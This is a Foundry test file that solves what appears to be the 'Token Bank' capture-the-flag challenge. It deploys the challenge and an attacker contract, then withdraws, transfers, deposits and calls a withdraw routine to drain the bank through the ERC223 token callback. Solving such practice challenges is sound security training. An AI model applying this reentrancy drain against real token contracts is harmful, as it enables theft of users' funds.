// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
        // Put your solution here
        // tokenBankChallenge get all the actual token
        // tokenBankChallenge balanceOf 50% for msg.sender(this caller), 50% for player
        uint256 amount = 500000 * 10 ** 18;
        tokenBankChallenge.withdraw( amount);
        SimpleERC223Token token = tokenBankChallenge.token();
        token.transfer(address(tokenBankAttacker), amount);
        tokenBankAttacker.deposit();
        tokenBankAttacker.callWithdraw();

 

       _checkSolved();
    }
        function tokenFallback(
        address from,
        uint256 value,
        bytes memory data
    ) external{

    }
    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
